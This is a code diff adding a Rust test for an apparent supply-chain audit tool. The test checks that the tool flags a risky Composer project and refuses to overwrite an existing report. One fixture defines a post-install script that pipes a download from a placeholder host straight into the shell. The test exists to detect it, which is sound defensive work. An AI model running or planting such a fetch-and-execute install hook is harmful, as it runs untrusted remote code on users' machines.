@@ -1,3 +1,4 @@
+use std::collections::HashSet;
 use std::fs;
 use std::io::{Read, Write};
 use std::net::TcpListener;
@@ -742,6 +743,107 @@ fn signs_bootstrap_snapshots_with_external_ed25519_trust() {
     fs::remove_dir_all(project).unwrap();
     fs::remove_file(private_key).unwrap();
     fs::remove_file(public_key).unwrap();
+}
+
+#[test]
+fn audits_composer_supply_chain_policy_and_integer_capabilities() {
+    let project = temporary_path("supply-chain");
+    fs::create_dir(&project).unwrap();
+    fs::write(
+        project.join("composer.json"),
+        r#"{
+  "name": "app/supply-chain",
+  "scripts": {"post-install-cmd": "curl https://example.invalid/install | sh"},
+  "config": {"allow-plugins": {"vendor/plugin": false}}
+}"#,
+    )
+    .unwrap();
+    fs::write(
+        project.join("composer.lock"),
+        r#"{
+  "packages": [{
+    "name": "vendor/plugin",
+    "version": "1.0.0",
+    "type": "composer-plugin",
+    "license": ["GPL-3.0-only"],
+    "authors": [{"name": "Unknown Maintainer", "email": "unknown@example.com"}],
+    "abandoned": true,
+    "dist": {"type": "zip", "url": "https://example.invalid/plugin.zip"}
+  }],
+  "packages-dev": []
+}"#,
+    )
+    .unwrap();
+    let policy = project.join("pam.supply-chain.json");
+    fs::write(
+        &policy,
+        r#"{
+  "schemaVersion": 1,
+  "denyScripts": true,
+  "allowedPlugins": ["trusted/plugin"],
+  "allowedMaintainers": ["security@example.com"],
+  "allowedLicenses": ["MIT"],
+  "requireDistReference": true,
+  "rejectAbandoned": true,
+  "allowedCapabilities": [1, 2]
+}"#,
+    )
+    .unwrap();
+    let capabilities = project.join("pam.capabilities.json");
+    fs::write(
+        &capabilities,
+        r#"{
+  "schemaVersion": 1,
+  "capabilities": [
+    {"kind": 3, "resources": ["*"]},
+    {"kind": 4, "resources": ["*"]}
+  ]
+}"#,
+    )
+    .unwrap();
+    let report = project.join("supply-chain.report.json");
+    let audited = run_pam(&[
+        "supply-chain",
+        project.to_str().unwrap(),
+        "--policy",
+        policy.to_str().unwrap(),
+        "--capabilities",
+        capabilities.to_str().unwrap(),
+        "--output",
+        report.to_str().unwrap(),
+        "--offline",
+    ]);
+    assert_eq!(audited.status.code(), Some(1));
+    assert!(
+        report.is_file(),
+        "stdout={} stderr={}",
+        String::from_utf8_lossy(&audited.stdout),
+        String::from_utf8_lossy(&audited.stderr)
+    );
+    let contract: serde_json::Value = serde_json::from_slice(&fs::read(&report).unwrap()).unwrap();
+    assert_eq!(contract["schemaVersion"], 1);
+    assert_eq!(contract["verdict"], 3);
+    assert_eq!(contract["advisoryState"], 2);
+    assert_eq!(contract["packages"], 1);
+    assert_eq!(contract["capabilities"], serde_json::json!([3, 4]));
+    let kinds = contract["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter_map(|finding| finding["kind"].as_u64())
+        .collect::<HashSet<_>>();
+    assert!(kinds.is_superset(&HashSet::from([1, 2, 3, 4, 5, 6, 7, 8])));
+
+    let overwrite = run_pam(&[
+        "supply-chain",
+        project.to_str().unwrap(),
+        "--output",
+        report.to_str().unwrap(),
+        "--offline",
+    ]);
+    assert!(!overwrite.status.success());
+    assert!(String::from_utf8_lossy(&overwrite.stderr).contains("refusing to overwrite"));
+    fs::remove_dir_all(project).unwrap();
 }
 
 #[test]
